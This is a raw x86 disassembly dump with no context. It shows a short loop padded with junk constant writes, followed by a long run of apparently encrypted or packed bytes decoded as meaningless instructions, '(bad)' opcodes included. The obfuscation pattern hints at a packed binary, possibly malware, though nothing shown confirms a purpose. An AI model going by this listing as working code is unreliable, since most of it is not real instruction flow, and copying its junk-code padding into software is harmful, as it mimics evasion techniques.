  40dccc:	add    BYTE PTR [edx+0x29],ch
  40dccf:	add    BYTE PTR [eax],al
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	cmp    BYTE PTR [edi],ah
  40dd65:	inc    esp
  40dd66:	push   ds
  40dd67:	shr    DWORD PTR [eax+edi*2+0x787e3578],cl
  40dd6e:	js     0x40ddb6
  40dd70:	arpl   WORD PTR [ecx+eiz*1-0x2d],di
  40dd74:	call   DWORD PTR ds:0x77b825b4
  40dd7a:	in     al,0xe2
  40dd7c:	push   esp
  40dd7d:	test   eax,edi
  40dd7f:	pusha  
  40dd80:	das    
  40dd81:	pop    es
  40dd82:	xchg   ebx,eax
  40dd83:	repnz add BYTE PTR [edi],bl
  40dd86:	inc    ecx
  40dd87:	pop    es
  40dd88:	xchg   edx,eax
  40dd89:	and    DWORD PTR fs:[eax+eiz*1-0x70deafd0],edi
  40dd91:	jb     0x40ddbc
  40dd93:	(bad)  
  40dd94:	out    0x1e,eax
  40dd96:	mov    DWORD PTR [edx-0x2053917d],ecx
  40dd9c:	mov    al,ds:0x42717a7a
  40dda1:	add    BYTE PTR [ebx-0x6db7a22],bl
  40dda7:	inc    ecx
  40dda8:	jmp    0x40dd74
  40ddaa:	cli    
  40ddab:	or     BYTE PTR [eax],0x73
  40ddae:	out    0xb5,al
  40ddb0:	dec    edi
  40ddb1:	sysret 
  40ddb3:	or     bl,ch
  40ddb5:	pop    ecx
  40ddb6:	jmp    0x40dd93
  40ddb8:	or     eax,0x5d04bfc4
  40ddbd:	add    BYTE PTR [ecx],al
  40ddbf:	clc    
  40ddc0:	cli    
  40ddc1:	outs   dx,BYTE PTR ds:[esi]
  40ddc2:	out    0x5,eax
  40ddc4:	fcom   QWORD PTR [edx+0x73]
  40ddc7:	ds clc 
  40ddc9:	xor    BYTE PTR [edx+ebp*4-0x251d7a82],ch
  40ddd0:	test   al,0x53
  40ddd2:	(bad)  
  40ddd3:	sub    DWORD PTR [ebx+0xc522acd],esp
  40ddd9:	dec    ebx
  40ddda:	les    ebp,FWORD PTR [edx-0x39]
  40dddd:	push   0xbeba037f
  40dde2:	dec    DWORD PTR [edx+edx*2]
  40dde5:	dec    DWORD PTR [ebp+0x38]
  40dde8:	sub    eax,0x808cb7de
  40dded:	sbb    ch,BYTE PTR [edi-0x21]
  40ddf0:	cwde   
  40ddf1:	jecxz  0x40dd9f
  40ddf3:	xchg   esi,eax
  40ddf4:	add    ebx,0x800f14c1
  40ddfa:	mov    al,BYTE PTR [ecx]
  40ddfc:	ror    ah,0x5b
  40ddff:	and    ah,ch
  40de01:	xchg   ebp,eax
  40de02:	lock out 0x15,eax
  40de05:	jle    0x40de5e
  40de07:	(bad)  
  40de08:	in     eax,dx
  40de09:	xchg   edx,eax
  40de0a:	repz iret 
  40de0c:	mov    al,0xf5
  40de0e:	fs or  ecx,ebp
  40de11:	cld    
  40de12:	cld    
  40de13:	cmp    BYTE PTR [edi+ebp*8-0x146b72b1],bl
  40de1a:	test   BYTE PTR [edx+0xfe74e5f],ch
  40de20:	xor    ebx,edi
  40de22:	inc    DWORD PTR [ebp+eax*1-0xefd6a94]
  40de29:	push   ecx
  40de2a:	cmp    BYTE PTR [eax],dh
  40de2c:	data16 mov ds,WORD PTR [eax+0x18]
  40de30:	outs   dx,DWORD PTR ds:[esi]
  40de31:	clc    
  40de32:	push   edx
  40de33:	jmp    0x23a6e198
  40de38:	bound  esp,QWORD PTR [ecx-0x18]
  40de3b:	repnz adc cl,BYTE PTR [eax]
  40de3e:	pop    es
  40de3f:	cmp    DWORD PTR [ecx],0xd40c7754
  40de45:	xor    DWORD PTR [edx],edx
  40de47:	push   0xfffffff8
  40de49:	jmp    0x9b0f:0x842de439
  40de50:	mov    al,BYTE PTR [eax-0x64]
  40de53:	jnp    0x40de66
  40de55:	mov    al,ds:0xf1f7b9f7
  40de5a:	xchg   esp,eax
  40de5b:	mov    esi,0x2cfdefb0
  40de60:	stc    
  40de61:	enter  0xdd69,0x13
  40de65:	push   es
  40de66:	sub    eax,DWORD PTR [ecx]
  40de68:	jnp    0x40de0c
  40de6a:	mov    eax,0xba6a9d9a
  40de6f:	scas   eax,DWORD PTR es:[edi]
  40de70:	(bad)  
  40de71:	cli    
  40de72:	retf   
  40de73:	jmp    0x8f584d03
  40de78:	jl     0x40de0a
  40de7a:	sub    dh,cl
  40de7c:	lods   eax,DWORD PTR ds:[esi]
  40de7d:	sub    BYTE PTR [edx+0x2f],dl
  40de80:	sub    eax,0x9a31449c
  40de85:	jae    0x40de1e
  40de87:	jp     0x40de40
  40de89:	clc    
  40de8a:	leave  
  40de8b:	xchg   ecx,eax
  40de8c:	loop   0x40de9b
  40de8e:	cmp    cl,BYTE PTR [edi-0x49cae1ff]
  40de94:	rol    eax,1
  40de96:	sub    ebp,DWORD PTR [edi+0x54f587ea]
  40de9c:	mov    ebp,0x45305bf9
  40dea1:	pop    esi
  40dea2:	inc    ebp
  40dea3:	es dec ebp
  40dea5:	mov    al,0xaa
  40dea7:	ins    BYTE PTR es:[edi],dx
  40dea8:	gs test eax,0x6f275574
  40deae:	mov    al,ds:0x245ea0a5
  40deb3:	aam    0xf
  40deb5:	pop    esp
  40deb6:	sub    eax,0x2f2c6e6c
  40debb:	in     al,0xba
  40debd:	push   ebp
  40debe:	cmp    al,0x2e
  40dec0:	clc    
  40dec1:	hlt    
  40dec2:	push   esp
  40dec3:	xchg   esi,eax
  40dec4:	mov    al,0x7d
  40dec6:	pop    ds
  40dec7:	ins    BYTE PTR es:[edi],dx
  40dec8:	mov    al,fs:0x479c2108
  40dece:	pop    edi
  40decf:	loop   0x40de8a
  40ded1:	adc    ecx,ecx
  40ded3:	clc    
  40ded4:	test   al,0x61
  40ded6:	pop    ecx
  40ded7:	inc    esp
  40ded8:	xchg   edx,eax
  40ded9:	xchg   ebp,eax
  40deda:	mov    eax,ds:0x6a0b312a
  40dedf:	sub    DWORD PTR [ecx],ecx
  40dee1:	dec    edx
  40dee2:	or     cl,BYTE PTR [esi+0x7406a26f]
  40dee8:	cmp    ah,BYTE PTR [ecx]
  40deea:	sbb    bl,BYTE PTR [edi]
  40deec:	(bad)  
  40deed:	out    dx,eax
  40deee:	fst    st(0)
  40def0:	(bad)  
  40def2:	out    0xc8,al
  40def4:	ds pop ebx
  40def6:	jns    0x40deca
  40def8:	inc    ecx
  40def9:	inc    esp
  40defa:	imul   edi,edi,0xffffffa6
  40defd:	jmp    0x291a70d6
  40df02:	outs   dx,DWORD PTR ds:[esi]
  40df03:	test   BYTE PTR [ebx+0xfb8107f],bh
  40df09:	cmp    ah,BYTE PTR [ecx+0xcd63373]
  40df0f:	sub    DWORD PTR [edi+0x17],ebp
  40df12:	es loopne 0x40df51
  40df15:	je     0x40df23
  40df17:	mov    fs,WORD PTR [eax+0x22]
  40df1a:	pop    DWORD PTR [eax+0x5db694ec]
  40df20:	imul   esi,DWORD PTR [ebx+0x48cd13ea],0xffffffa3
  40df27:	int3   
  40df28:	out    dx,al
  40df29:	(bad)  
  40df2a:	out    0x2b,eax
  40df2c:	add    al,0xde
  40df2e:	push   es
  40df2f:	cmp    edx,edi
  40df31:	xor    dl,bh
  40df33:	sbb    DWORD PTR [esi-0x7373d095],0x95b77a9a
  40df3d:	ret    0x1ee8
  40df40:	cmp    al,0xc7
  40df42:	jge    0x40df22
  40df44:	inc    ebp
  40df45:	jl     0x40df7c
  40df47:	outs   dx,DWORD PTR ds:[esi]
  40df48:	aas    
  40df49:	inc    ecx
  40df4a:	mov    dh,0x76
  40df4c:	xchg   esi,eax
  40df4d:	mov    ds:0xc0ce5ea4,eax
  40df52:	or     eax,0xbaf22bd7
  40df57:	icebp  
  40df58:	pop    edx
  40df59:	std    
  40df5a:	add    eax,0x576048a7
  40df5f:	inc    esp
  40df60:	jg     0x40df0e
  40df62:	ja     0x40df53
  40df64:	iret   
  40df65:	loope  0x40df17
  40df67:	mov    ?,WORD PTR [eax-0xb]
  40df6a:	jae    0x40dfd1
  40df6c:	xchg   ebx,eax
  40df6d:	pop    es
  40df6e:	cwde   
  40df6f:	mov    bl,0x58
  40df71:	sbb    eax,0x25ccfd4e
  40df76:	aad    0xf
  40df78:	js     0x40df8d
  40df7a:	jle    0x40df34
  40df7c:	jo     0x40df6f
  40df7e:	push   es
  40df7f:	add    eax,0x45582c23
  40df84:	and    DWORD PTR [esi-0x80],ebx
  40df87:	iret   
  40df88:	xor    esi,DWORD PTR ds:[edx]
  40df8b:	mov    dh,0xea
  40df8d:	(bad)  
  40df8e:	(bad)  [edx]
  40df90:	(bad)  
  40df91:	push   cs
  40df92:	mov    ecx,0xcc7d88fc
  40df97:	mov    ah,0xc8
  40df99:	scas   al,BYTE PTR es:[edi]
  40df9a:	je     0x40dfa9
  40df9c:	mov    esi,0x57f16a2
  40dfa1:	and    eax,edx
  40dfa3:	ret    
  40dfa4:	outs   dx,DWORD PTR ds:[esi]
  40dfa5:	mov    WORD PTR [edx],fs
  40dfa7:	and    edx,eax
  40dfa9:	cdq    
  40dfaa:	add    eax,ebx
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x6740413a],1
  40dfde:	jnp    0x40df6f
  40dfe0:	and    DWORD PTR [eax+0x357878b2],ecx
  40dfe6:	jle    0x40e060
  40dfe8:	js     0x40dfe6
  40dfea:	lahf   
  40dfeb:	das    
  40dfec:	adc    eax,0x1b41982d
  40dff1:	xor    al,0xd5
  40dff3:	dec    esi
  40dff4:	idiv   DWORD PTR [edx+eax*2-0x20]
  40dff8:	jno    0x40dfa7
  40dffa:	jmp    0xe8fe:0x5213d2db
  40e001:	jp     0x40dfe2
  40e003:	loop   0x40dfc0
  40e005:	mov    dh,0x15
  40e007:	into   
  40e008:	(bad)  
  40e00a:	mov    gs,WORD PTR [ebx-0x31]
  40e00d:	gs push 0xffffffc6
  40e010:	fdivr  DWORD PTR [ecx+0x43]
  40e013:	loopne 0x40dffd
  40e015:	xor    al,0x78
  40e017:	(bad)  
  40e019:	int3   
  40e01a:	stos   DWORD PTR es:[edi],eax
  40e01b:	xor    al,0xc4
  40e01d:	les    eax,FWORD PTR [ebp-0x54]
  40e020:	(bad)  
  40e021:	test   BYTE PTR [eax+0x1f],0xd0
  40e025:	js     0x40e08b
  40e027:	jns    0x40dfad
  40e029:	in     al,0x26
  40e02b:	adc    cl,bh
  40e02d:	mov    dl,0xad
  40e02f:	sbb    al,0xb4
  40e031:	stc    
  40e032:	mov    dh,0x82
  40e034:	aaa    
  40e035:	shl    esi,0xfe
  40e038:	mov    ebx,0x4b21aa0d
  40e03d:	mov    esi,ss
  40e03f:	in     eax,dx
  40e040:	fadd   DWORD PTR [esi-0x2a89a8cf]
  40e046:	mov    al,ds:0x56a3880a
  40e04b:	popf   
  40e04c:	pop    ebp
  40e04d:	add    eax,0x4b3962e1
  40e052:	add    eax,0x1fc97689
  40e057:	nop
  40e058:	leave  
  40e059:	fnstcw WORD PTR [edx+0x4109088]
  40e05f:	imul   esp,DWORD PTR [ebp+0x3d05a439],0x2adb73d8
  40e069:	add    BYTE PTR ds:0xba5d4aa8,ah
  40e06f:	clc    
  40e070:	out    dx,al
  40e071:	adc    eax,0x9a968fef
  40e076:	shr    ebp,0x9
  40e079:	or     ebp,DWORD PTR [esi-0x47]
  40e07c:	mov    ebx,0xdf1b82db
  40e081:	dec    ecx
  40e082:	ss mov ebx,0x80cac056
  40e088:	ret    
  40e089:	mov    esp,DWORD PTR [esi-0x6e]
  40e08c:	aad    0x54
  40e08e:	aad    0x7f
  40e090:	cli    
  40e091:	in     al,0xf
  40e093:	push   ebx
  40e094:	(bad)  
  40e095:	mov    WORD PTR gs:[esi+0x62],?
  40e099:	je     0x40e0c5
  40e09b:	loop   0x40e06f
  40e09d:	in     al,0xbb
  40e09f:	cmp    al,cl
  40e0a1:	stos   DWORD PTR es:[edi],eax
  40e0a2:	push   ebx
  40e0a3:	mov    ds:0xe8b38a27,al
  40e0a8:	loopne 0x40e0b6
  40e0aa:	push   eax
  40e0ab:	pop    esp
  40e0ac:	test   al,0x41
  40e0ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0af:	jae    0x40e0c4
  40e0b1:	jl     0x40e077
  40e0b3:	inc    esi
  40e0b4:	or     BYTE PTR [ebx+0x63],al
  40e0b7:	or     eax,0x8e25d133
  40e0bc:	fisubr WORD PTR [esi+0x37]
  40e0bf:	xor    al,0x84
  40e0c1:	mov    ah,0x48
  40e0c3:	dec    ebx
  40e0c4:	retf   0x1267
  40e0c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0c8:	adc    DWORD PTR [esi],edi
  40e0ca:	(bad)  
  40e0cc:	mov    eax,ds:0x96c5cf2d
  40e0d1:	cmp    ch,BYTE PTR [edi-0x1d]
  40e0d4:	adc    edx,DWORD PTR [edi+0x34]
  40e0d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0d8:	lods   eax,DWORD PTR ds:[esi]
  40e0d9:	fadd   st(1),st
  40e0db:	ret    
  40e0dc:	push   0x48
  40e0de:	fdivr  st,st(1)
  40e0e0:	aas    
  40e0e1:	daa    
  40e0e2:	test   DWORD PTR [edx],esi
  40e0e4:	enter  0xc9dc,0xd8
  40e0e8:	mov    cl,0xcb
  40e0ea:	and    bh,BYTE PTR [ebx+0x2b]
  40e0ed:	sbb    eax,0xb187b29e
  40e0f2:	jp     0x40e0f4
  40e0f4:	ror    DWORD PTR [eax],1
  40e0f6:	adc    BYTE PTR es:[ebp-0x71],dl
  40e0fa:	jp     0x40e0ab
  40e0fc:	pop    esp
  40e0fd:	inc    esp
  40e0fe:	add    eax,0x1803bc6c
  40e103:	stos   BYTE PTR es:[edi],al
  40e104:	aam    0xa4
  40e106:	imul   esp,DWORD PTR [edx+0x75],0xffffffd6
  40e10a:	imul   eax,DWORD PTR [edi-0x23ceed53],0xe684d0c5
  40e114:	jmp    0xa719a60d
  40e119:	js     0x40e14d
  40e11b:	imul   ebp,DWORD PTR ds:0x3bfe17d1,0x4aaa6a8f
  40e125:	les    edi,FWORD PTR [ebp+0x6c]
  40e128:	add    DWORD PTR [edi-0x3d],0x1
  40e12c:	test   al,0x6d
  40e12e:	out    dx,eax
  40e12f:	out    dx,eax
  40e130:	retf   
  40e131:	adc    dh,BYTE PTR [edx-0x166ef0bf]
  40e137:	xor    al,0xa4
  40e139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e13a:	mov    edi,0x1a975079
  40e13f:	add    esp,DWORD PTR [edi]
  40e141:	mov    dh,0x13
  40e143:	mov    al,ch
  40e145:	and    esi,ebp
  40e147:	sbb    al,0xd9
  40e149:	and    BYTE PTR [edx],bh
  40e14b:	enter  0x1c2c,0x9c
  40e14f:	sub    al,0x8f
  40e151:	mov    eax,ds:0xfd3979ea
  40e156:	stos   BYTE PTR es:[edi],al
  40e157:	rcl    BYTE PTR [edi-0x3ab286ac],1
  40e15d:	cmp    ecx,DWORD PTR [eax-0x72]
  40e160:	cmp    DWORD PTR [edi],eax
  40e162:	add    dl,bh
  40e164:	mov    ecx,0xd73bfa3a
  40e169:	add    BYTE PTR [edi],dh
  40e16b:	aas    
  40e16c:	jmp    0x6c05:0x68968a25
  40e173:	mov    ch,0x0
  40e175:	in     eax,0xd2
  40e177:	test   esi,edi
  40e179:	mov    fs,WORD PTR [ecx-0x15ca4a43]
  40e17f:	arpl   WORD PTR [edx+0x3f],dx
  40e182:	nop
  40e183:	adc    ecx,DWORD PTR [eax]
  40e185:	retf   0xf279
  40e188:	jae    0x40e1f4
  40e18a:	lea    esi,[ebp+eiz*2+0x67d1d318]
  40e191:	enter  0xc579,0xf3
  40e195:	out    0xd2,eax
  40e197:	mov    al,0x9d
  40e199:	mov    bh,0x7
  40e19b:	add    eax,0x8e9a3a29
  40e1a0:	shr    BYTE PTR [eax-0x56ae348b],cl
  40e1a6:	loopne 0x40e1bf
  40e1a8:	xchg   esp,eax
  40e1a9:	test   al,0xb8
  40e1ab:	inc    ebx
  40e1ac:	gs jle 0x40e1ba
  40e1af:	or     BYTE PTR [ebx],bl
  40e1b1:	or     cl,BYTE PTR [edx+0x77]
  40e1b4:	add    esi,DWORD PTR [eax+eiz*2+0x27]
  40e1b8:	clc    
  40e1b9:	mov    dh,0xdf
  40e1bb:	inc    esp
  40e1bc:	aas    
  40e1bd:	imul   esi,DWORD PTR [edi+esi*8-0x2c8c9480],0x397b73e0
  40e1c8:	mov    edx,0x8a3e8228
  40e1cd:	cmp    al,0x34
  40e1cf:	hlt    
  40e1d0:	xchg   ecx,eax
  40e1d1:	mov    bl,0x9f
  40e1d3:	repz sbb DWORD PTR [ecx-0x738da8a8],ecx
  40e1da:	add    edx,edi
  40e1dc:	in     eax,0x28
  40e1de:	je     0x40e1db
  40e1e0:	mov    dl,0x4
  40e1e2:	cli    
  40e1e3:	adc    DWORD PTR [eax],ebx
  40e1e5:	int    0x9a
  40e1e7:	push   esp
  40e1e8:	leave  
  40e1e9:	fsub   QWORD PTR [edi-0x711c5134]
  40e1ef:	sbb    eax,0xa2b64a3a
  40e1f4:	rcl    BYTE PTR [edi-0x1f43f609],cl
  40e1fa:	ret    
  40e1fb:	add    al,0xf3
  40e1fd:	les    ecx,FWORD PTR [ebx+0x1a1d0acb]
  40e203:	fs stos DWORD PTR es:[edi],eax
  40e205:	into   
  40e206:	shl    edx,1
  40e208:	ds cmp al,0xd8
  40e20b:	mov    al,0x44
  40e20d:	mov    dh,0x5b
  40e20f:	ror    cl,0x34
  40e212:	cmp    dl,cl
  40e214:	push   0xfffffffd
  40e216:	cmp    bh,bh
  40e218:	jg     0x40e281
  40e21a:	push   esi
  40e21b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e21c:	es mov eax,es
  40e21f:	jne    0x40e213
  40e221:	dec    edi
  40e222:	fcomp  QWORD PTR [esi+0x33]
  40e225:	mov    BYTE PTR [ebx],0xc3
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	push   eax
  40e23b:	mov    ecx,edx
  40e23d:	daa    
  40e23e:	inc    ebp
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e2b3
  40e247:	cmp    eax,0x6e97b952
  40e24c:	add    BYTE PTR [esi+0x321209ca],dl
  40e252:	dec    esp
  40e253:	and    ecx,DWORD PTR [edx+0x53]
  40e256:	fs int 0xec
  40e259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e25a:	mov    ds:0xf5d1ff9,al
  40e25f:	adc    BYTE PTR [ebx+0x27b8db71],0xd2
  40e266:	inc    ebx
  40e267:	aad    0xc8
  40e269:	es test edi,esp
  40e26c:	jmp    0x4cc9:0xd6e98455
  40e273:	lods   al,BYTE PTR ds:[esi]
  40e274:	mov    bh,0x7d
  40e276:	pop    esi
  40e277:	jne    0x40e27e
  40e279:	(bad)  
  40e27a:	into   
  40e27b:	jb     0x40e23d
  40e27d:	inc    edi
  40e27e:	mov    ds:0x19885433,eax
  40e283:	mul    BYTE PTR [ebx+0x5871948]
  40e289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e28a:	jne    0x40e246
  40e28c:	jbe    0x40e28d
  40e28e:	lea    edx,[ebp-0x553f57c4]
  40e294:	mov    al,ds:0x61f36606
  40e299:	loopne 0x40e288
  40e29b:	xchg   ebx,eax
  40e29c:	sub    dh,dh
  40e29e:	aam    0x4b
  40e2a0:	ret    
  40e2a1:	mov    cs,WORD PTR [eax]
  40e2a3:	rcl    BYTE PTR [eax],cl
  40e2a5:	dec    ecx
  40e2a6:	or     edx,DWORD PTR [ecx]
  40e2a8:	inc    eax
  40e2a9:	push   es
  40e2aa:	or     eax,0xc340dfab
  40e2af:	add    ebp,eax
  40e2b1:	daa    
  40e2b2:	jl     0x40e26d
  40e2b4:	les    edx,FWORD PTR [eax]
  40e2b6:	xchg   DWORD PTR [ecx+0x70e552ff],ebp
  40e2bc:	fimul  WORD PTR [edx+ebx*2+0x74]
  40e2c0:	stc    
  40e2c1:	test   BYTE PTR [ebx+edi*2+0x7a],dl
  40e2c5:	(bad)  [edi]
  40e2c7:	lock mov bl,0x1d
  40e2ca:	stos   DWORD PTR es:[edi],eax
  40e2cb:	mov    dh,0xb4
  40e2cd:	in     eax,dx
  40e2ce:	inc    ebx
  40e2cf:	fwait
  40e2d0:	xchg   ecx,eax
  40e2d1:	xchg   esp,eax
  40e2d2:	into   
  40e2d3:	ss or  al,bl
  40e2d6:	scas   eax,DWORD PTR es:[edi]
  40e2d7:	hlt    
  40e2d8:	cld    
  40e2d9:	sbb    eax,0x33e84cd2
  40e2de:	push   ss
  40e2df:	mov    ebp,0xc78385c7
  40e2e4:	xchg   ebp,eax
  40e2e5:	push   0xffffff8e
  40e2e7:	pop    ebx
  40e2e8:	or     al,0x23
  40e2ea:	pop    edx
  40e2eb:	sub    DWORD PTR [ebx],0xffffff95
  40e2ee:	imul   edx,DWORD PTR [edx-0x254c62cb],0x51
  40e2f5:	dec    ecx
  40e2f6:	mov    bh,0x1a
  40e2f8:	loope  0x40e2f6
  40e2fa:	outs   dx,DWORD PTR ds:[esi]
  40e2fb:	pop    edi
  40e2fc:	xor    DWORD PTR [ecx-0x32],0xffffff99
  40e300:	repnz in al,0x12
  40e303:	jecxz  0x40e28c
  40e305:	call   0xf1ecb2be
  40e30a:	popf   
  40e30b:	test   eax,0x62c2a4be
  40e310:	jnp    0x40e2d4
  40e312:	jb     0x40e2d6
  40e314:	xor    al,0x58
  40e316:	adc    DWORD PTR [ecx+0x0],edi
  40e319:	xchg   edi,eax
  40e31a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e31b:	pop    edi
  40e31c:	mov    bl,0x5
  40e31e:	ss mov bl,0xb6
  40e321:	bound  eax,QWORD PTR [ebp-0x65]
  40e324:	sbb    ebp,DWORD PTR [esi+0x2d]
  40e327:	idiv   DWORD PTR [edi]
  40e329:	in     eax,0x32
  40e32b:	rcr    DWORD PTR [eax],0x1c
  40e32e:	stos   DWORD PTR es:[edi],eax
  40e32f:	je     0x40e313
  40e331:	xchg   ecx,eax
  40e332:	xchg   ebp,eax
  40e333:	mov    ecx,0x3159387a
  40e338:	sti    
  40e339:	sub    eax,DWORD PTR [edx-0x35e4dca3]
  40e33f:	scas   al,BYTE PTR es:[edi]
  40e340:	fbld   TBYTE PTR [eax]
  40e342:	sahf   
  40e343:	pop    eax
  40e344:	das    
  40e345:	jg     0x40e32d
  40e347:	jmp    0x40e2d7
  40e349:	mov    ah,0xe0
  40e34b:	jno    0x40e3bf
  40e34d:	inc    ecx
  40e34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e34f:	jg     0x40e340
  40e351:	dec    esi
  40e352:	cmp    BYTE PTR [edi+0x64],dh
  40e355:	lods   eax,DWORD PTR ds:[esi]
  40e356:	mov    ah,0x4c
  40e358:	ror    DWORD PTR [edx],1
  40e35a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e35b:	(bad)  
  40e35c:	jl     0x40e34b
  40e35e:	cmp    esp,edi
  40e360:	inc    eax
  40e361:	or     al,0x48
  40e363:	loopne 0x40e32d
  40e365:	cli    
  40e366:	cmp    DWORD PTR [ebx-0x3e],edi
  40e369:	push   esi
  40e36a:	jbe    0x40e32b
  40e36c:	(bad)  
  40e36d:	mov    ah,0x96
  40e36f:	add    BYTE PTR [edx-0x33bc6624],0xac
  40e376:	daa    
  40e377:	in     al,dx
  40e378:	push   ebp
  40e379:	out    0x33,eax
  40e37b:	or     edx,DWORD PTR [edi+0x583e7f55]
  40e381:	les    ebp,FWORD PTR [esi+eiz*1-0x4d84f98e]
  40e388:	jle    0x40e31e
  40e38a:	and    DWORD PTR [edx],edi
  40e38c:	jmp    0x33b0d1f1
  40e391:	ret    
  40e392:	test   eax,0xb63e56dd
  40e397:	scas   al,BYTE PTR es:[edi]
  40e398:	xor    dl,BYTE PTR ss:[edx-0x6e]
  40e39c:	cli    
  40e39d:	xchg   dl,cl
  40e39f:	sub    al,0xe2
  40e3a1:	inc    eax
  40e3a2:	push   cs
  40e3a3:	jle    0x40e3d1
  40e3a5:	fwait
  40e3a6:	mov    esi,0xd34f07f1
  40e3ab:	loop   0x40e37c
  40e3ad:	cmpps  xmm2,XMMWORD PTR [ecx-0x2241715c],0xaf
  40e3b5:	aas    
  40e3b6:	ret    0xa4b2
  40e3b9:	xor    BYTE PTR [edx-0x49],dl
  40e3bc:	cmp    esp,edx
  40e3be:	loope  0x40e345
  40e3c0:	dec    esi
  40e3c1:	fild   DWORD PTR [esi-0x16ee3671]
  40e3c7:	leave  
  40e3c8:	popa   
  40e3c9:	es pusha 
  40e3cb:	add    DWORD PTR [esi+esi*4],0x789dd5f7
  40e3d2:	dec    eax
  40e3d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3d4:	sbb    bl,al
  40e3d6:	add    DWORD PTR [ecx+0x2e8008c4],ebx
  40e3dc:	out    0xa3,al
  40e3de:	sti    
  40e3df:	jecxz  0x40e3e8
  40e3e1:	ss shl al,cl
  40e3e4:	loopne 0x40e411
  40e3e6:	aam    0x75
  40e3e8:	pop    ss
  40e3e9:	ss dec esp
  40e3eb:	ja     0x40e414
  40e3ed:	std    
  40e3ee:	fstp   QWORD PTR [ecx+edx*4+0x18]
  40e3f2:	cwde   
  40e3f3:	pop    ds
  40e3f4:	loope  0x40e413
  40e3f6:	ins    BYTE PTR es:[edi],dx
  40e3f7:	aaa    
  40e3f8:	jl     0x40e411
  40e3fa:	mov    WORD PTR [eax-0x169ea85c],ss
  40e400:	add    ah,BYTE PTR [esi]
  40e402:	lods   al,BYTE PTR ds:[esi]
  40e403:	out    dx,eax
  40e404:	sub    al,0xbd
  40e406:	pop    ss
  40e407:	ret    
  40e408:	inc    edi
  40e409:	jbe    0x40e42a
  40e40b:	sti    
  40e40c:	in     eax,dx
  40e40d:	cld    
  40e40e:	lods   eax,DWORD PTR ds:[esi]
  40e40f:	repnz (bad) 
  40e411:	fidiv  DWORD PTR [ebx-0x1eced811]
  40e417:	(bad)  
  40e419:	repz inc ecx
  40e41b:	push   edi
  40e41c:	test   BYTE PTR ds:0xf5ade3fd,bl
  40e422:	(bad)  
  40e423:	(bad)  
  40e424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e425:	push   DWORD PTR ds:0xc668cdfb
  40e42b:	push   0xffffff96
  40e42d:	repnz adc DWORD PTR [ebp-0x2134cc18],ebx
  40e434:	jp     0x40e495
  40e436:	add    ebx,esi
  40e438:	adc    ch,bh
  40e43a:	das    
  40e43b:	mov    dl,0x84
  40e43d:	jbe    0x40e47f
  40e43f:	popf   
  40e440:	xchg   ebx,eax
  40e441:	cmp    eax,0xa3b76299
  40e446:	push   0x4754e03f
  40e44b:	aam    0x7b
  40e44d:	pop    edx
  40e44e:	repnz addr16 xchg esp,eax
  40e451:	push   ecx
  40e452:	pop    ebp
  40e453:	pop    esi
  40e454:	sub    ecx,DWORD PTR [eax+edx*4+0x6bcf667b]
  40e45b:	out    dx,eax
  40e45c:	lock xchg DWORD PTR [edx-0x7],ebp
  40e460:	into   
  40e461:	int    0x9e
  40e463:	or     al,BYTE PTR [edx-0x6b]
  40e466:	mov    DWORD PTR [ecx+0xc],esi
  40e469:	daa    
  40e46a:	dec    esp
